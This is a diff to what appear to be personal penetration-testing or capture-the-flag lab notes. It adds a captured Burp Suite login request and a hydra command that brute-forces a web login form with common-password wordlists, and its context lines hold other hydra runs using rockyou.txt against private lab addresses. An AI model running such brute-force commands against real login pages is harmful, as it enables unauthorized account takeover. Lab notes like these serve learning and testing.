@@ -66,3 +66,28 @@ hydra -l scr1ptkiddy -P passwords.txt 10.10.136.50 http-post-form \
 
 
 sudo hydra -l R1ckRul3s -P rockyou.txt 10.65.165.164 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=login failed"
+
+
+- burpsuite form
+
+POST /login/index.php HTTP/1.1
+Host: 192.168.110.101
+Content-Length: 51
+Cache-Control: max-age=0
+Accept-Language: ko-KR,ko;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: http://192.168.110.101
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.110.101/login/
+Accept-Encoding: gzip, deflate, br
+Cookie: ISPCSESS=n5g33db3sjduau5fkoocckdvss
+Connection: keep-alive
+
+username=test&password=test2&s_mod=login&s_pg=index
+
+
+```bash
+hydra -L /usr/share/wordlists/seclists/Passwords/Common-Credentials/common-passwords-win.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/common-passwords-win.txt 192.168.110.101 http-post-form "/login/index.php:username=^USER^&password=^PASS^:F=로그인실패문구"
+```
